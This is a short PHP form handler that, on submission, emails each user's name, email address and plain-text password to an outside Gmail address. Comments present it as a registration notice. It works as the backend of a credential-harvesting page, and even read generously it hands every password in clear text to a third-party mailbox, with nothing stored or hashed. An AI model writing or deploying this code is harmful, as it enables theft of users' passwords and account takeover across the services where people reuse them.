<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get user input from the form
    $name = $_POST["name"];
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Set your email address where you want to receive registration notifications
    $to = "palastinearabia@gmail.com";

    // Email subject and message
    $subject = "New User Registration";
    $message = "Name: $name\nEmail: $email\nPassword: $password";

    // Send the email
    mail($to, $subject, $message);

    
    exit();
}
?>
